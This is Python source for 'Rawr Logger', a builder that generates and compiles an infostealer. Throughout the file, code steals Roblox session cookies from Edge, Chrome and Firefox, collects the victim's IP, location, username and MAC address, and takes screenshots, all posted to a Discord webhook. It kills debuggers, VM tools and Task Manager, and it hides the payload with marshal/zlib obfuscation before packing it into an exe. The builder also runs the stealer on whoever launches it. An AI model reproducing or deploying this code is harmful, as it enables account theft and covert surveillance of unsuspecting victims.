import os,time,requests,socket,threading,shutil,marshal,platform,zlib,json
import browser_cookie3
import re, uuid
from pystyle import *
from PIL import ImageGrab


program_blacklist = [
    "httpdebuggerui.exe", 
    "wireshark.exe", 
    "HTTPDebuggerSvc.exe", 
    "fiddler.exe", 
    "regedit.exe", 
    "taskmgr.exe", 
    "vboxservice.exe", 
    "df5serv.exe", 
    "processhacker.exe", 
    "vboxtray.exe", 
    "vmtoolsd.exe", 
    "vmwaretray.exe", 
    "ida64.exe", 
    "ollydbg.exe",
    "pestudio.exe", 
    "vmwareuser", 
    "vgauthservice.exe", 
    "vmacthlp.exe", 
    "x96dbg.exe", 
    "vmsrvc.exe", 
    "x32dbg.exe", 
    "vmusrvc.exe", 
    "prl_cc.exe", 
    "prl_tools.exe", 
    "xenservice.exe", 
    "qemu-ga.exe", 
    "joeboxcontrol.exe", 
    "ksdumperclient.exe", 
    "ksdumper.exe",
    "joeboxserver.exe"
]

def anti_debug():
    while True:
        time.sleep(1)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in program_blacklist):
                try:
                    post_message(f"Anti-Debug Program: {proc.name()} was detected running on the system. Closing program...")
                    proc.kill()
                    os._exit(1)
                except(psutil.NoSuchProcess, psutil.AccessDenied): pass

threading.Thread(name='Anti-Debug', target=anti_debug).start()
                        
u = os.getlogin()
webhook = "Webhooksss"
machines = platform.uname()
hostname = socket.gethostname()  
ips = requests.get('https://api.ipify.org').text
info = requests.get("http://ipinfo.io/json").json()
city = info['city']
hostname = info['hostname']
country = info['country']
region = info['region']
lang = info['loc']
post = info['postal']
timezone = info['timezone']
org = info['org']
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname) 
embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
            "embeds": [
                {
                    "author": {
                        "name": "Rawr Logger",

                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f" @everyone You Got A Hit ```There Public Ip Is: {ips}``` ```There City Is: {city}``` ```There Country Is: {country}``` ```There Region Is: {region}``` ```There Lang is: {lang}```  ```There Postal Code Is: {post}``` ```There Organzation Is: {org}```   ```There Hostname From There Is: {hostname}```  ```There PC Ip Is:{ip}``` ```There Pc Username Is: {pc_username}``` ```There Pc Host Name Is: {hostname}``` ```There Pc Machine Name Is: {machines.machine}``` ```There Pc Processer Is: {machines.processor}``` ```There Pc Mac Address Is : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
                }
            ]
        }
requests.post(webhook, json=embed) 
def edge():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
                    "footer": {
                      "text": "Rawr Logger Made By Jose And The Soap1"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
         embedssa = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Edge Cookie Was Not Found```",                      
                }
            ]

        }
         requests.post(webhook, json=embedssa) 
def chromes():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
                    "footer": {
                      "text": "Rawr Logger Made By Jose And The Soap1"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
         embedsss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Google Chrome Cookie Was Not Found```",                      
                }
            ]

        }
         requests.post(webhook, json=embedsss) 
         pass
def firefoxs():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
                    "footer": {
                      "text": "Rawr Logger Made By Jose And The Soap1"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
         embeded = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Fire Fox Cookie Was Not Found```",                      
                }
            ]

        }
         requests.post(webhook, json=embeded) 
         pass

browsers = [firefoxs,edge,chromes]
for i in browsers:
  threading.Thread(target=i,).start()
  pass
screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save("image.png")
screenshot.close()
with open('image.png', 'rb') as f:
  requests.post(webhook,files={'upload_file': f})
os.remove('image.png')

Write.Print(Center.XCenter("""
    ____                         __                               
   / __ \____ __      _______   / /   ____  ____ _____ ____  _____
  / /_/ / __ `/ | /| / / ___/  / /   / __ \/ __ `/ __ `/ _ \/ ___/
 / _, _/ /_/ /| |/ |/ / /     / /___/ /_/ / /_/ / /_/ /  __/ /    
/_/ |_|\__,_/ |__/|__/_/     /_____/\____/\__, /\__, /\___/_/     
                                         /____//____/             
              Made By Jose#0001,TheSoap1#9870                                        
"""), Colors.green_to_yellow, interval=0)
webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.white_to_green, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print("Webhook Is Not Working\n",Colors.white_to_red, interval=0.01) 
    time.sleep(3) 
    exit()
name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
code = """
import os
import browser_cookie3
import requests
import json
import re, uuid
from PIL import ImageGrab
import socket
import threading
import platform


os.system(f'cls & title Rawr Logger!')
os.system("taskkill /f /im  ProcessHacker.exe")
os.system('cls')
os.system("taskkill /f /im  phacker.exe")
os.system('cls')
os.system("taskkill /f /im  dnspy.exe")
os.system('cls')
os.system("taskkill /f /im  dnSpy.exe")
os.system('cls')
os.system("taskkill /f /im  wireshark.exe")
os.system('cls')
os.system("taskkill /f /im  Fiddler.exe")
os.system('cls')
os.system("taskkill /f /im  cmd.exe")
os.system('cls')
os.system("taskkill /f /im  taskmgr")
os.system('cls')
os.system("taskkill /f /im  vboxservice")
os.system('cls')
os.system("taskkill /f /im  vboxservice.exe")
os.system('cls')
os.system("taskkill /f /im  vboxtray")
os.system('cls')
os.system("taskkill /f /im  joeboxcontrol")
os.system('cls')
os.system("taskkill /f /im  x96dbg.exe")
os.system('cls')
os.system("taskkill /f /im  vmsrvc.exe")
os.system('cls')
os.system("taskkill /f /im  vmwareuser.exe")
os.system('cls')
os.system("taskkill /f /im  vgauthservice.exe")
os.system('cls')
os.system("taskkill /f /im  vmacthlp.exe")
os.system('cls')
os.system("taskkill /f /im  vmtoolsd.exe")
os.system('cls')
u = os.getlogin()
webhook = "johns"
machines = platform.uname()
hostname = socket.gethostname()  
ips = requests.get('https://api.ipify.org').text
info = requests.get("http://ipinfo.io/json").json()
city = info['city']
hostname = info['hostname']
country = info['country']
region = info['region']
lang = info['loc']
post = info['postal']
timezone = info['timezone']
org = info['org']
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname) 
embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
            "embeds": [
                {
                    "author": {
                        "name": "Rawr Logger",

                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f" @everyone You Got A Hit ```There Public Ip Is: {ips}``` ```There City Is: {city}``` ```There Country Is: {country}``` ```There Region Is: {region}``` ```There Lang is: {lang}```  ```There Postal Code Is: {post}``` ```There Organzation Is: {org}```   ```There Hostname From There Is: {hostname}```  ```There PC Ip Is:{ip}``` ```There Pc Username Is: {pc_username}``` ```There Pc Host Name Is: {hostname}``` ```There Pc Machine Name Is: {machines.machine}``` ```There Pc Processer Is: {machines.processor}``` ```There Pc Mac Address Is : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
                }
            ]
        }
requests.post(webhook, json=embed) 
def edge():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
                    "footer": {
                      "text": "Rawr Logger Made By Jose And The Soap1"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
         embedssa = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Edge Cookie Was Not Found```",                      
                }
            ]

        }
         requests.post(webhook, json=embedssa) 
def chromes():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
                    "footer": {
                      "text": "Rawr Logger Made By Jose And The Soap1"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
         embedsss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Google Chrome Cookie Was Not Found```",                      
                }
            ]

        }
         requests.post(webhook, json=embedsss) 
         pass
def firefoxs():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
                    "footer": {
                      "text": "Rawr Logger Made By Jose And The Soap1"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
         embeded = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                    },
                    "description": f"```Roblox Fire Fox Cookie Was Not Found```",                      
                }
            ]

        }
         requests.post(webhook, json=embeded) 
         pass

browsers = [firefoxs,edge,chromes]
for i in browsers:
  threading.Thread(target=i,).start()
  pass
screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save("image.png")
screenshot.close()
with open('image.png', 'rb') as f:
  requests.post(webhook,files={'upload_file': f})
os.remove('image.png')
"""
with open(f'{name}.py', 'a') as f:
    f.write(code.replace("johns", webhook))
time.sleep(2)
Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
prot = Write.Input("Would you like to add protection y/n:",Colors.white_to_green, interval=0.01)
if prot == 'y':
    with open(f'{name}.py') as fi:
        pro = fi.read()
    mar = marshal.dumps(pro)
    zlb = zlib.compress(mar)
    with open(f"{name}.py", 'w') as f:
        f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
    if compile == "y":
        os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="pystyle"  --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3"  --hidden-import="json"  --hidden-import="platform"  --hidden-import="re"  --hidden-import="uuid" {name}.py')
        os.remove(f'{name}.spec')
        Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
        time.sleep(2)
        Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
        time.sleep(3)
        exit()
    elif compile == "n":
      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
      time.sleep(3)
      exit()


elif prot == 'n':
    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
    if compile == "y":
      os.system(f"pyinstaller --onefile --noconsole {name}.py")
      shutil.rmtree('build')
      os.remove(f'{name}.spec')
      Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
      time.sleep(2)
      Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
      time.sleep(3)
      exit()
    elif compile == "n":
      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
      time.sleep(3)
      exit()
